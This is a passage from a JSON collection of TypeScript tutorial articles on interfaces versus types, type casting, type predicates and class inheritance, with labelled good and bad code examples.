{\n  message: string;\n  code: number;\n};\n\n// Type for function signature\ntype ApiMethod<TRequest, TResponse> = (\n  request: TRequest\n) => Promise<ApiResponse<TResponse>>;\n\n// Interface for service contract\ninterface UserService {\n  getUser(id: string): Promise<ApiResponse<User>>;\n  createUser(request: CreateUserRequest): Promise<ApiResponse<User>>;\n  deleteUser(id: string): Promise<ApiResponse<void>>;\n}\n\n// Implementation\nclass ApiUserService implements UserService {\n  async getUser(id: string): Promise<ApiResponse<User>> {\n    try {\n      const response = await fetch(`/api/users/${id}`);\n      const data = await response.json();\n      return { status: 'success', data };\n    } catch (error) {\n      return {\n        status: 'error',\n        error: { message: error.message, code: 500 }\n      };\n    }\n  }\n  \n  async createUser(request: CreateUserRequest): Promise<ApiResponse<User>> {\n    // Implementation\n  }\n  \n  async deleteUser(id: string): Promise<ApiResponse<void>> {\n    // Implementation\n  }\n}\n```\n\n### Declaration Merging in Practice\n\n```typescript\n// Extending Express Request type\n\n// Existing Express types (in node_modules)\ndeclare namespace Express {\n  interface Request {\n    method: string;\n    url: string;\n  }\n}\n\n// Your application - add custom properties\ndeclare namespace Express {\n  interface Request {\n    user?: {\n      id: string;\n      role: string;\n    };\n    correlationId: string;\n  }\n}\n\n// Now your middleware can use these properties\napp.use((req, res, next) => {\n  req.correlationId = generateId();\n  req.user = authenticateUser(req);\n  next();\n});\n\napp.get('/profile', (req, res) => {\n  // TypeScript knows about user and correlationId\n  const userId = req.user?.id;\n  const corrId = req.correlationId;\n});\n\n// This is only possible with interfaces (declaration merging)\n```\n\n### Advanced Type Patterns\n\n```typescript\n// Conditional types (types only)\ntype IsString<T> = T extends string ? 'yes' : 'no';\ntype A = IsString<'hello'>;  // 'yes'\ntype B = IsString<42>;       // 'no'\n\n// Extract return type\ntype GetReturnType<T> = T extends (...args: any[]) => infer R ? R : never;\n\nfunction getUser() {\n  return { id: 1, name: 'Alice' };\n}\n\ntype User = GetReturnType<typeof getUser>;\n// { id: number; name: string }\n\n// Template literal types (types only)\ntype HTTPMethod = 'GET' | 'POST' | 'PUT' | 'DELETE';\ntype Endpoint = `/api/${string}`;\ntype Route = `${HTTPMethod} ${Endpoint}`;\n\nconst route: Route = 'GET /api/users';     // ✅\nconst invalid: Route = 'PATCH /users';     // ❌ Error\n\n// Mapped types with key remapping (types only)\ntype Getters<T> = {\n  [K in keyof T as `get${Capitalize<string & K>}`]: () => T[K]\n};\n\ninterface User {\n  name: string;\n  age: number;\n}\n\ntype UserGetters = Getters<User>;\n// {\n//   getName: () => string;\n//   getAge: () => number;\n// }\n```\n\n### Interface Extension Patterns\n\n```typescript\n// Multiple interface extension\ninterface Timestamped {\n  createdAt: Date;\n  updatedAt: Date;\n}\n\ninterface Auditable {\n  createdBy: string;\n  updatedBy: string;\n}\n\ninterface Entity extends Timestamped, Auditable {\n  id: string;\n}\n\n// Result\nconst entity: Entity = {\n  id: '123',\n  createdAt: new Date(),\n  updatedAt: new Date(),\n  createdBy: 'alice',\n  updatedBy: 'bob'\n};\n\n// Equivalent with types\ntype Entity = {\n  id: string;\n} & Timestamped & Auditable;\n```\n\n### Best Practices Summary\n\n```typescript\n// ✅ Team Convention Example 1: \"Interface-first\"\n// Use interfaces for all object shapes, types for everything else\n\ninterface User { }           // Objects\ninterface ApiService { }     // Contracts\ntype UserId = string;        // Primitives\ntype Status = 'idle' | 'loading';  // Unions\n\n// ✅ Team Convention Example 2: \"Type-first\"\n// Use types by default, interfaces only for OOP patterns\n\ntype User = { };             // Objects\ntype ApiService = { };       // Contracts\ntype Status = 'idle' | 'loading';  // Unions\n\ninterface Repository { }     // Only for class implementations\n\n// ✅ Team Convention Example 3: \"Pragmatic\"\n// Choose based on specific features needed\n\ninterface ComponentProps { } // React props (convention)\ntype State = 'idle' | 'loading';  // Unions (types only)\ninterface BaseService { }    // Extendable contracts\ntype Utility<T> = T | null;  // Utilities (types only)\n\n// Key: Pick ONE approach and be consistent across the codebase\n```\n\n### Migration Guide\n\n```typescript\n// Converting Interface to Type\n\n// Before (interface)\ninterface User {\n  name: string;\n  email: string;\n}\n\n// After (type) - simple conversion\ntype User = {\n  name: string;\n  email: string;\n};\n\n// Converting Type to Interface\n\n// Before (type) - simple object\ntype Product = {\n  id: number;\n  name: string;\n};\n\n// After (interface) - direct conversion\ninterface Product {\n  id: number;\n  name: string;\n}\n\n// Before (type) - with union (CANNOT convert)\ntype Status = 'pending' | 'done';\n\n// ❌ Cannot be interface - keep as type\n```\n\n### Quick Reference\n\n```typescript\n// INTERFACES CAN:\n✅ Define object shapes\n✅ Extend other interfaces\n✅ Be implemented by classes\n✅ Merge declarations\n✅ Define function signatures\n✅ Use generics\n✅ Have index signatures\n\n// INTERFACES CANNOT:\n❌ Represent unions\n❌ Represent primitives\n❌ Represent tuples\n❌ Use mapped types\n❌ Use conditional types\n\n// TYPES CAN:\n✅ Define object shapes\n✅ Represent unions\n✅ Represent primitives\n✅ Represent tuples\n✅ Use mapped types\n✅ Use conditional types\n✅ Compose with intersections\n✅ Use template literals\n✅ Extract/infer types\n\n// TYPES CANNOT:\n❌ Merge declarations\n❌ Be re-declared (duplicate identifier error)\n\n// BOTH CAN:\n✅ Define object shapes\n✅ Use generics\n✅ Have optional properties\n✅ Have readonly properties\n✅ Define function signatures\n✅ Have index signatures\n✅ Be extended/composed\n```"
    },
    {
      "id": "swe/languages/javascript/typing/type-casting",
      "title": "TypeScript Type Casting: Complete Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "typing",
        "type-casting"
      ],
      "content": "# TypeScript Type Casting: Complete Overview\n\nType casting (type assertion) tells TypeScript to treat a value as a specific type, overriding its inferred type. Using `as Type` or `<Type>`, you assert \"I know this is actually Type X, trust me.\" Think of it like showing your real ID after wearing a disguise—you're revealing the true identity TypeScript couldn't see on its own.\n\n## Key Points\n\n- **Syntax:** `value as Type` or `<Type>value` (prefer `as`)\n- **Purpose:** Override TypeScript's type inference\n- **Not Runtime:** Doesn't change JavaScript, only TypeScript's understanding\n- **Use Sparingly:** Bypasses type safety, can hide bugs\n- **Safer Alternative:** Type guards and type predicates\n\n## Basic Syntax\n\n```typescript\n// as syntax (preferred)\nconst input = document.getElementById('email') as HTMLInputElement;\n\n// Angle bracket syntax (avoid in TSX/React)\nconst input = <HTMLInputElement>document.getElementById('email');\n\n// Both identical, use 'as' for consistency\n```\n\n## Common Use Cases\n\n### DOM Elements\n\n```typescript\n// TypeScript infers HTMLElement (generic)\nconst button = document.getElementById('submit');\n// button.value  // ❌ Error: Property 'value' doesn't exist\n\n// Cast to specific element type\nconst input = document.getElementById('email') as HTMLInputElement;\ninput.value = 'user@example.com';  // ✅ Works\n\nconst canvas = document.querySelector('canvas') as HTMLCanvasElement;\nconst ctx = canvas.getContext('2d');  // ✅ TypeScript knows it's canvas\n```\n\n### API Responses\n\n```typescript\ninterface User {\n  id: number;\n  name: string;\n}\n\n// API returns 'any' or 'unknown'\nconst response = await fetch('/api/user');\nconst data = await response.json();  // Type: any\n\n// Cast to expected type\nconst user = data as User;\nconsole.log(user.name);  // ✅ TypeScript knows structure\n\n// Better: Validate first\nfunction isUser(obj: any): obj is User {\n  return obj && typeof obj.id === 'number' && typeof obj.name === 'string';\n}\n\nif (isUser(data)) {\n  console.log(data.name);  // ✅ Type-safe\n}\n```\n\n### Union Types\n\n```typescript\ntype Result = string | number;\n\nfunction process(value: Result) {\n  // TypeScript doesn't know which type\n  // value.toUpperCase();  // ❌ Error: might be number\n  \n  // Assert specific type\n  if (typeof value === 'string') {\n    (value as string).toUpperCase();  // ✅ But unnecessary here\n  }\n  \n  // Better: Type guard narrows automatically\n  if (typeof value === 'string') {\n    value.toUpperCase();  // ✅ No cast needed!\n  }\n}\n```\n\n### Third-Party Libraries\n\n```typescript\n// Library has incomplete/wrong types\nimport { someFunction } from 'poorly-typed-lib';\n\nconst result = someFunction() as CustomType;\n\n// Window extensions\ndeclare global {\n  interface Window {\n    myApp: {\n      config: object;\n    };\n  }\n}\n\nconst config = window.myApp.config as AppConfig;\n```\n\n## const Assertions\n\n```typescript\n// Regular inference\nconst colors = ['red', 'blue'];\n// Type: string[]\n\n// const assertion - readonly, literal types\nconst colors = ['red', 'blue'] as const;\n// Type: readonly ['red', 'blue']\n\n// Object const assertion\nconst user = {\n  name: 'John',\n  role: 'admin'\n} as const;\n// Type: { readonly name: 'John'; readonly role: 'admin' }\n\n// Useful for enum-like values\nconst STATUS = {\n  PENDING: 'pending',\n  DONE: 'done'\n} as const;\n\ntype Status = typeof STATUS[keyof typeof STATUS];\n// Type: 'pending' | 'done'\n```\n\n## Double Casting (Escape Hatch)\n\n```typescript\n// Can't cast directly between unrelated types\nconst num = 123;\nconst str = num as string;  // ❌ Error: types not compatible\n\n// Double cast via 'unknown' or 'any'\nconst str = num as unknown as string;  // ✅ Works but dangerous!\n\n// Only use when absolutely necessary\n// Usually indicates a design problem\n```\n\n## Non-Null Assertion\n\n```typescript\n// Tell TypeScript \"this is definitely not null/undefined\"\nconst button = document.getElementById('submit')!;\n//                                               ^ Non-null assertion\n\n// Equivalent to:\nconst button = document.getElementById('submit') as HTMLElement;\n\n// Use carefully - crashes at runtime if actually null\nconst value = maybeNull!.property;  // Runtime error if null\n```\n\n## Casting vs Type Guards\n\n```typescript\n// ❌ Casting - no runtime check\nfunction processCast(value: unknown) {\n  const user = value as User;\n  console.log(user.name);  // Crashes if not User\n}\n\n// ✅ Type guard - runtime check\nfunction processGuard(value: unknown) {\n  if (isUser(value)) {\n    console.log(value.name);  // Safe\n  }\n}\n\nfunction isUser(obj: any): obj is User {\n  return obj && typeof obj.name === 'string';\n}\n```\n\n## When to Avoid Casting\n\n```typescript\n// ❌ Bad: Casting to bypass errors\ninterface User {\n  name: string;\n}\n\nconst user = { email: 'test@example.com' } as User;\n// Compiles but wrong - name is missing!\n\n// ✅ Good: Fix the actual type\nconst user: User = {\n  name: 'John',\n  email: 'test@example.com'  // ❌ Error: email not in User\n};\n\n\n// ❌ Bad: Unnecessary casting\nfunction double(x: number) {\n  return (x * 2) as number;  // Unnecessary - already number\n}\n\n// ✅ Good: Let TypeScript infer\nfunction double(x: number) {\n  return x * 2;  // TypeScript knows this is number\n}\n```\n\n## Safe Casting Pattern\n\n```typescript\n// Validate before casting\nfunction safeCast<T>(data: unknown, validator: (x: unknown) => x is T): T | null {\n  return validator(data) ? data : null;\n}\n\n// Usage\nconst user = safeCast(apiResponse, isUser);\nif (user) {\n  console.log(user.name);  // Safe\n}\n\n// Or with Zod\nimport { z } from 'zod';\n\nconst UserSchema = z.object({\n  name: z.string(),\n  email: z.string()\n});\n\ntype User = z.infer<typeof UserSchema>;\n\nfunction parseUser(data: unknown): User {\n  return UserSchema.parse(data);  // Throws if invalid\n}\n\nconst user = parseUser(apiResponse);  // Type-safe\n```\n\n## Common Patterns\n\n```typescript\n// Event handlers\nconst handleClick = (e: Event) => {\n  const target = e.target as HTMLButtonElement;\n  console.log(target.value);\n};\n\n// Better with type guard\nif (e.target instanceof HTMLButtonElement) {\n  console.log(e.target.value);\n}\n\n// JSON parsing\nconst data = JSON.parse(jsonString) as MyType;\n\n// Better with validation\nconst result = MyTypeSchema.safeParse(JSON.parse(jsonString));\nif (result.success) {\n  const data = result.data;  // Type-safe\n}\n\n// localStorage\nconst stored = localStorage.getItem('user') as string;\nconst user = JSON.parse(stored) as User;\n\n// Better with null check\nconst stored = localStorage.getItem('user');\nif (stored) {\n  const user = JSON.parse(stored) as User;\n}\n```\n\n## TypeScript Configuration\n\n```json\n// tsconfig.json\n{\n  \"compilerOptions\": {\n    \"strict\": true,\n    \"noImplicitAny\": true,        // Catch missing types\n    \"strictNullChecks\": true      // Catch null/undefined\n  }\n}\n```\n\n## Best Practices\n\n```typescript\n// ✅ Use 'as' syntax, not angle brackets\nconst input = value as HTMLInputElement;  // Good\nconst input = <HTMLInputElement>value;    // Avoid (conflicts with JSX)\n\n// ✅ Validate runtime data before casting\nif (isUser(data)) {\n  const user = data;  // No cast needed\n}\n\n// ✅ Use const assertions for literals\nconst config = { timeout: 3000 } as const;\n\n// ✅ Prefer type guards over casting\nfunction isString(x: unknown): x is string {\n  return typeof x === 'string';\n}\n\n// ❌ Don't cast to bypass real type errors\nconst broken = wrongType as CorrectType;  // Fix wrongType instead\n\n// ❌ Don't double cast without good reason\nconst sketchy = value as unknown as AnyType;  // Code smell\n\n// ❌ Don't use 'any' to avoid fixing types\nconst lazy = value as any;  // Defeats TypeScript's purpose\n```\n\n## References\n\n- [TypeScript Handbook: Type Assertions](https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#type-assertions)\n- [TypeScript Deep Dive: Type Assertion](https://basarat.gitbook.io/typescript/type-system/type-assertion)\n\n---\n\n## Summary\n\n**Type Casting:** Tell TypeScript to treat value as specific type using `as Type`.\n\n**Syntax:**\n```typescript\nvalue as Type           // Preferred\n<Type>value            // Avoid (JSX conflicts)\nvalue as const         // Literal types, readonly\nvalue!                 // Non-null assertion\n```\n\n**Common Uses:**\n- DOM: `getElementById('x') as HTMLInputElement`\n- API: `response.json() as User`\n- Literals: `['a', 'b'] as const`\n\n**Warnings:**\n- No runtime check—TypeScript only\n- Can hide bugs if used incorrectly\n- Bypasses type safety\n\n**Rule of thumb:** Avoid casting when possible. Use type guards for validation. Cast only when you have information TypeScript doesn't (DOM types, validated API responses). Never cast to fix type errors—fix the types instead."
    },
    {
      "id": "swe/languages/javascript/typing/type-predicates",
      "title": "TypeScript Type Predicates: Complete Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "typing",
        "type-predicates"
      ],
      "content": "# TypeScript Type Predicates: Complete Overview\n\nType predicates are TypeScript functions that perform runtime checks and narrow types, using the `is` keyword to tell the compiler the specific type of a value. Instead of just returning `boolean`, they return `value is Type`, enabling type narrowing in conditional blocks. Think of type predicates as a security checkpoint that not only checks if someone has valid ID, but also tells the system exactly what kind of ID it is (passport vs driver's license).\n\n## Key Points\n\n- **Syntax:** `function isType(value: unknown): value is Type`\n- **Purpose:** Narrow types based on runtime checks\n- **Returns:** Boolean, but TypeScript understands type implications\n- **Use Case:** Type guards with explicit type information\n- **Benefit:** Type safety with runtime validation\n\n## Basic Example\n\n### Without Type Predicate\n\n```typescript\n// Regular boolean check - no type narrowing\nfunction isString(value: unknown): boolean {\n  return typeof value === 'string';\n}\n\nconst value: unknown = \"hello\";\n\nif (isString(value)) {\n  console.log(value.toUpperCase());  \n  // ❌ Error: Object is of type 'unknown'\n  // TypeScript doesn't know value is string\n}\n```\n\n### With Type Predicate\n\n```typescript\n// Type predicate - enables type narrowing\nfunction isString(value: unknown): value is string {\n  return typeof value === 'string';\n}\n\nconst value: unknown = \"hello\";\n\nif (isString(value)) {\n  console.log(value.toUpperCase());  \n  // ✅ Works! TypeScript knows value is string\n}\n```\n\n## Basic Syntax\n\n```typescript\n// Pattern\nfunction isType(value: unknown): value is Type {\n  // Runtime check\n  return /* boolean check */;\n}\n\n// Examples\nfunction isNumber(value: unknown): value is number {\n  return typeof value === 'number';\n}\n\nfunction isArray(value: unknown): value is Array<any> {\n  return Array.isArray(value);\n}\n\nfunction isNull(value: unknown): value is null {\n  return value === null;\n}\n```\n\n## Common Patterns\n\n### Object Type Guards\n\n```typescript\ninterface User {\n  name: string;\n  email: string;\n}\n\ninterface Admin {\n  name: string;\n  email: string;\n  permissions: string[];\n}\n\n// Check if object is User\nfunction isUser(value: unknown): value is User {\n  return (\n    typeof value === 'object' &&\n    value !== null &&\n    'name' in value &&\n    'email' in value &&\n    typeof (value as User).name === 'string' &&\n    typeof (value as User).email === 'string'\n  );\n}\n\n// Check if User is Admin\nfunction isAdmin(user: User): user is Admin {\n  return 'permissions' in user;\n}\n\n// Usage\nconst data: unknown = fetchData();\n\nif (isUser(data)) {\n  console.log(data.name);  // ✅ TypeScript knows it's User\n  \n  if (isAdmin(data)) {\n    console.log(data.permissions);  // ✅ Knows it's Admin\n  }\n}\n```\n\n### Array Type Guards\n\n```typescript\nfunction isStringArray(value: unknown): value is string[] {\n  return (\n    Array.isArray(value) &&\n    value.every(item => typeof item === 'string')\n  );\n}\n\nfunction isNumberArray(value: unknown): value is number[] {\n  return (\n    Array.isArray(value) &&\n    value.every(item => typeof item === 'number')\n  );\n}\n\n// Usage\nconst data: unknown = [\"a\", \"b\", \"c\"];\n\nif (isStringArray(data)) {\n  const upper = data.map(s => s.toUpperCase());  // ✅ Works\n}\n```\n\n### Discriminated Unions\n\n```typescript\ninterface Circle {\n  kind: 'circle';\n  radius: number;\n}\n\ninterface Square {\n  kind: 'square';\n  size: number;\n}\n\ntype Shape = Circle | Square;\n\nfunction isCircle(shape: Shape): shape is Circle {\n  return shape.kind === 'circle';\n}\n\nfunction isSquare(shape: Shape): shape is Square {\n  return shape.kind === 'square';\n}\n\n// Usage\nfunction getArea(shape: Shape): number {\n  if (isCircle(shape)) {\n    return Math.PI * shape.radius ** 2;  // ✅ Knows radius exists\n  }\n  \n  if (isSquare(shape)) {\n    return shape.size ** 2;  // ✅ Knows size exists\n  }\n  \n  // TypeScript knows all cases handled\n  const _exhaustive: never = shape;\n  return _exhaustive;\n}\n```\n\n### Nullable Type Guards\n\n```typescript\nfunction isDefined<T>(value: T | undefined): value is T {\n  return value !== undefined;\n}\n\nfunction isNotNull<T>(value: T | null): value is T {\n  return value !== null;\n}\n\nfunction isPresent<T>(value: T | null | undefined): value is T {\n  return value !== null && value !== undefined;\n}\n\n// Usage\nconst users: (User | undefined)[] = [\n  { name: 'Alice', email: 'alice@example.com' },\n  undefined,\n  { name: 'Bob', email: 'bob@example.com' }\n];\n\nconst validUsers = users.filter(isDefined);\n// Type: User[] (undefined filtered out)\n\nvalidUsers.forEach(user => {\n  console.log(user.name);  // ✅ No undefined check needed\n});\n```\n\n## Advanced Examples\n\n### Generic Type Predicates\n\n```typescript\n// Check if value has specific property\nfunction hasProperty<T, K extends string>(\n  obj: T,\n  key: K\n): obj is T & Record<K, unknown> {\n  return typeof obj === 'object' && obj !== null && key in obj;\n}\n\n// Usage\nconst data: unknown = { name: 'John', age: 30 };\n\nif (hasProperty(data, 'name')) {\n  console.log(data.name);  // ✅ TypeScript knows name exists\n}\n\nif (hasProperty(data, 'email')) {\n  console.log(data.email);  // ✅ TypeScript knows email exists\n}\n```\n\n### Nested Type Guards\n\n```typescript\ninterface ApiResponse {\n  data: unknown;\n  error?: string;\n}\n\ninterface UserData {\n  id: number;\n  name: string;\n}\n\nfunction isUserData(value: unknown): value is UserData {\n  return (\n    typeof value === 'object' &&\n    value !== null &&\n    'id' in value &&\n    'name' in value &&\n    typeof (value as UserData).id === 'number' &&\n    typeof (value as UserData).name === 'string'\n  );\n}\n\nfunction isSuccessResponse(\n  response: ApiResponse\n): response is ApiResponse & { data: UserData } {\n  return !response.error && isUserData(response.data);\n}\n\n// Usage\nconst response: ApiResponse = await fetchUser();\n\nif (isSuccessResponse(response)) {\n  console.log(response.data.id);    // ✅ Knows data is UserData\n  console.log(response.data.name);  // ✅ No casting needed\n}\n```\n\n### Class Instance Checks\n\n```typescript\nclass Dog {\n  bark() {\n    console.log('Woof!');\n  }\n}\n\nclass Cat {\n  meow() {\n    console.log('Meow!');\n  }\n}\n\ntype Pet = Dog | Cat;\n\nfunction isDog(pet: Pet): pet is Dog {\n  return pet instanceof Dog;\n}\n\nfunction isCat(pet: Pet): pet is Cat {\n  return pet instanceof Cat;\n}\n\n// Usage\nconst pet: Pet = new Dog();\n\nif (isDog(pet)) {\n  pet.bark();  // ✅ TypeScript knows it's Dog\n}\n\nif (isCat(pet)) {\n  pet.meow();  // ✅ TypeScript knows it's Cat\n}\n```\n\n### Error Type Guards\n\n```typescript\nfunction isError(value: unknown): value is Error {\n  return value instanceof Error;\n}\n\nfunction isCustomError(error: Error): error is Error & { code: number } {\n  return 'code' in error;\n}\n\n// Usage\ntry {\n  throw new Error('Something went wrong');\n} catch (e) {\n  if (isError(e)) {\n    console.log(e.message);  // ✅ Knows it's Error\n    \n    if (isCustomError(e)) {\n      console.log(e.code);  // ✅ Knows code exists\n    }\n  }\n}\n```\n\n## Filter with Type Predicates\n\n```typescript\n// Array.filter with type narrowing\nconst mixed: (string | number | null)[] = ['a', 1, null, 'b', 2];\n\n// Without type predicate\nconst strings1 = mixed.filter(x => typeof x === 'string');\n// Type: (string | number | null)[] ❌ No narrowing\n\n// With type predicate\nfunction isString(value: unknown): value is string {\n  return typeof value === 'string';\n}\n\nconst strings2 = mixed.filter(isString);\n// Type: string[] ✅ Properly narrowed\n\n// Generic filter helper\nfunction filterByType<T, S extends T>(\n  array: T[],\n  predicate: (value: T) => value is S\n): S[] {\n  return array.filter(predicate);\n}\n\n// Usage\nconst numbers = filterByType(mixed, (x): x is number => typeof x === 'number');\n// Type: number[]\n```\n\n## Assertion Functions vs Type Predicates\n\n```typescript\n// Type predicate - returns boolean\nfunction isString(value: unknown): value is string {\n  return typeof value === 'string';\n}\n\nif (isString(value)) {\n  // value is string in this block\n}\n\n// Assertion function - throws on false\nfunction assertIsString(value: unknown): asserts value is string {\n  if (typeof value !== 'string') {\n    throw new Error('Value is not a string');\n  }\n}\n\nassertIsString(value);\n// value is string after this line (or function threw)\nconsole.log(value.toUpperCase());  // ✅ Works\n```\n\n## Common Pitfalls\n\n```typescript\n// ❌ Type predicate doesn't match implementation\nfunction isNumber(value: unknown): value is number {\n  return typeof value === 'string';  // ❌ Says number but checks string!\n}\n\n// TypeScript trusts you, runtime breaks\nconst x: unknown = 'hello';\nif (isNumber(x)) {\n  const doubled = x * 2;  // Runtime error! x is string\n}\n\n\n// ❌ Incomplete runtime check\ninterface User {\n  name: string;\n  email: string;\n  age: number;\n}\n\nfunction isUser(value: unknown): value is User {\n  return (\n    typeof value === 'object' &&\n    value !== null &&\n    'name' in value\n    // ❌ Missing checks for email and age!\n  );\n}\n\nconst data = { name: 'John' };\nif (isUser(data)) {\n  console.log(data.email.toLowerCase());  // Runtime error!\n}\n\n\n// ✅ Complete runtime check\nfunction isUser(value: unknown): value is User {\n  return (\n    typeof value === 'object' &&\n    value !== null &&\n    'name' in value &&\n    'email' in value &&\n    'age' in value &&\n    typeof (value as User).name === 'string' &&\n    typeof (value as User).email === 'string' &&\n    typeof (value as User).age === 'number'\n  );\n}\n```\n\n## Validation Libraries\n\n```typescript\n// Using Zod for runtime validation + type predicates\nimport { z } from 'zod';\n\nconst UserSchema = z.object({\n  name: z.string(),\n  email: z.string().email(),\n  age: z.number()\n});\n\ntype User = z.infer<typeof UserSchema>;\n\nfunction isUser(value: unknown): value is User {\n  return UserSchema.safeParse(value).success;\n}\n\n// Or use Zod's built-in guard\nconst data: unknown = fetchData();\n\nconst result = UserSchema.safeParse(data);\nif (result.success) {\n  console.log(result.data.name);  // ✅ TypeScript knows type\n}\n```\n\n## Real-World Example\n\n```typescript\n// API response handling\ninterface ApiSuccess<T> {\n  status: 'success';\n  data: T;\n}\n\ninterface ApiError {\n  status: 'error';\n  message: string;\n  code: number;\n}\n\ntype ApiResponse<T> = ApiSuccess<T> | ApiError;\n\n// Type predicate for success\nfunction isSuccess<T>(\n  response: ApiResponse<T>\n): response is ApiSuccess<T> {\n  return response.status === 'success';\n}\n\n// Type predicate for error\nfunction isError<T>(\n  response: ApiResponse<T>\n): response is ApiError {\n  return response.status === 'error';\n}\n\n// Usage\nasync function fetchUser(id: number) {\n  const response: ApiResponse<User> = await fetch(`/api/users/${id}`)\n    .then(r => r.json());\n  \n  if (isSuccess(response)) {\n    console.log(response.data.name);  // ✅ Knows data is User\n    return response.data;\n  }\n  \n  if (isError(response)) {\n    console.error(response.message);   // ✅ Knows error properties\n    throw new Error(response.message);\n  }\n}\n```\n\n## Best Practices\n\n```typescript\n// ✅ Make runtime check match type predicate exactly\nfunction isNumber(value: unknown): value is number {\n  return typeof value === 'number';  // Matches predicate\n}\n\n// ✅ Check all required properties\nfunction isUser(value: unknown): value is User {\n  return (\n    typeof value === 'object' &&\n    value !== null &&\n    'name' in value &&\n    'email' in value &&\n    typeof (value as User).name === 'string' &&\n    typeof (value as User).email === 'string'\n  );\n}\n\n// ✅ Use generic type predicates for reusability\nfunction hasProperty<K extends string>(\n  obj: unknown,\n  key: K\n): obj is Record<K, unknown> {\n  return typeof obj === 'object' && obj !== null && key in obj;\n}\n\n// ✅ Combine with validation libraries\nimport { z } from 'zod';\n\nconst schema = z.object({ name: z.string() });\nfunction isValid(data: unknown): data is z.infer<typeof schema> {\n  return schema.safeParse(data).success;\n}\n\n// ❌ Don't trust type predicates without proper checks\nfunction isBad(value: unknown): value is ComplexType {\n  return true;  // ❌ Lying to TypeScript!\n}\n\n// ❌ Don't forget null/undefined checks\nfunction isBad(value: unknown): value is User {\n  return 'name' in value;  // ❌ Crashes if value is null\n}\n```\n\n## References\n\n- [TypeScript Handbook: Type Predicates](https://www.typescriptlang.org/docs/handbook/2/narrowing.html#using-type-predicates)\n- [TypeScript Deep Dive: Type Guards](https://basarat.gitbook.io/typescript/type-system/typeguard)\n- [Zod Documentation](https://zod.dev/)\n\n---\n\n## Summary\n\n**Type Predicate:** Function that narrows types using `value is Type` syntax.\n\n**Syntax:**\n```typescript\nfunction isType(value: unknown): value is Type {\n  return /* runtime check */;\n}\n```\n\n**Common Uses:**\n- Object validation: `value is User`\n- Array filtering: `array.filter(isString)`\n- Discriminated unions: `shape is Circle`\n- Null checks: `value is T` (not undefined)\n\n**Key Points:**\n- Runtime check must match type predicate claim\n- Check all properties thoroughly\n- Use with `filter()` for type-safe arrays\n- Combine with validation libraries (Zod)\n\n**Rule of thumb:** Type predicates bridge runtime and compile-time type safety. Always ensure runtime checks match type claims. Use validation libraries for complex types."
    },
    {
      "id": "swe/languages/javascript/typing/typescript-inheritance",
      "title": "TypeScript Inheritance: Complete Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "typing",
        "typescript-inheritance"
      ],
      "content": "# TypeScript Inheritance: Complete Overview\n\nInheritance in TypeScript allows a class (child/derived class) to inherit properties and methods from another class (parent/base class), enabling code reuse and creating hierarchical relationships between classes. It implements the \"is-a\" relationship where a derived class is a specialized version of its base class. Think of it like a family tree—children inherit traits from parents but can also have their own unique characteristics.\n\n## Key Points\n\n- **Syntax:** Use `extends` keyword to inherit from a base class\n- **Access:** Child classes inherit public and protected members, not private\n- **Override:** Child classes can override parent methods with their own implementation\n- **Super:** Use `super` to call parent constructor or methods\n- **Abstract Classes:** Define blueprints that child classes must implement\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic Inheritance**\n\n   ```typescript\n   class Animal {\n     name: string;\n     \n     constructor(name: string) {\n       this.name = name;\n     }\n     \n     makeSound(): void {\n       console.log('Some generic sound');\n     }\n   }\n   \n   class Dog extends Animal {\n     breed: string;\n     \n     constructor(name: string, breed: string) {\n       super(name); // Call parent constructor\n       this.breed = breed;\n     }\n     \n     makeSound(): void {\n       console.log('Woof! Woof!');\n     }\n   }\n   \n   const dog = new Dog('Max', 'Labrador');\n   console.log(dog.name); // 'Max' (inherited)\n   dog.makeSound(); // 'Woof! Woof!' (overridden)\n   ```\n\n2. **Access Modifiers (public, protected, private)**\n\n   ```typescript\n   class Vehicle {\n     public brand: string;      // Accessible everywhere\n     protected year: number;     // Accessible in class and subclasses\n     private vin: string;        // Only accessible in this class\n     \n     constructor(brand: string, year: number, vin: string) {\n       this.brand = brand;\n       this.year = year;\n       this.vin = vin;\n     }\n   }\n   \n   class Car extends Vehicle {\n     getInfo(): string {\n       return `${this.brand} (${this.year})`; // ✅ Can access protected\n       // return this.vin; // ❌ Error: private property\n     }\n   }\n   \n   const car = new Car('Toyota', 2023, 'ABC123');\n   console.log(car.brand); // ✅ 'Toyota'\n   // console.log(car.year); // ❌ Error: protected property\n   ```\n\n3. **Using Super for Parent Methods**\n\n   ```typescript\n   class Employee {\n     constructor(public name: string, public salary: number) {}\n     \n     getDetails(): string {\n       return `${this.name}: $${this.salary}`;\n     }\n   }\n   \n   class Manager extends Employee {\n     constructor(name: string, salary: number, public department: string) {\n       super(name, salary);\n     }\n     \n     getDetails(): string {\n       return `${super.getDetails()} (Manager of ${this.department})`;\n       // Calls parent method, then adds more info\n     }\n   }\n   \n   const manager = new Manager('Alice', 90000, 'Engineering');\n   console.log(manager.getDetails());\n   // 'Alice: $90000 (Manager of Engineering)'\n   ```\n\n4. **Abstract Classes (Cannot Instantiate)**\n\n   ```typescript\n   abstract class Shape {\n     constructor(public color: string) {}\n     \n     abstract getArea(): number; // Must be implemented by child\n     abstract getPerimeter(): number;\n     \n     describe(): void {\n       console.log(`A ${this.color} shape with area ${this.getArea()}`);\n     }\n   }\n   \n   class Circle extends Shape {\n     constructor(color: string, public radius: number) {\n       super(color);\n     }\n     \n     getArea(): number {\n       return Math.PI * this.radius ** 2;\n     }\n     \n     getPerimeter(): number {\n       return 2 * Math.PI * this.radius;\n     }\n   }\n   \n   // const shape = new Shape('red'); // ❌ Error: cannot instantiate abstract\n   const circle = new Circle('red', 5); // ✅\n   circle.describe(); // 'A red shape with area 78.54...'\n   ```\n\n5. **Multiple Level Inheritance**\n\n   ```typescript\n   class LivingThing {\n     breathe(): void {\n       console.log('Breathing...');\n     }\n   }\n   \n   class Animal extends LivingThing {\n     move(): void {\n       console.log('Moving...');\n     }\n   }\n   \n   class Mammal extends Animal {\n     feedYoung(): void {\n       console.log('Feeding young with milk');\n     }\n   }\n   \n   const cat = new Mammal();\n   cat.breathe();   // From LivingThing\n   cat.move();      // From Animal\n   cat.feedYoung(); // From Mammal\n   ```\n\n6. **Interfaces with Inheritance**\n\n   ```typescript\n   interface Printable {\n     print(): void;\n   }\n   \n   interface Scannable {\n     scan(): void;\n   }\n   \n   class Document implements Printable {\n     print(): void {\n       console.log('Printing document...');\n     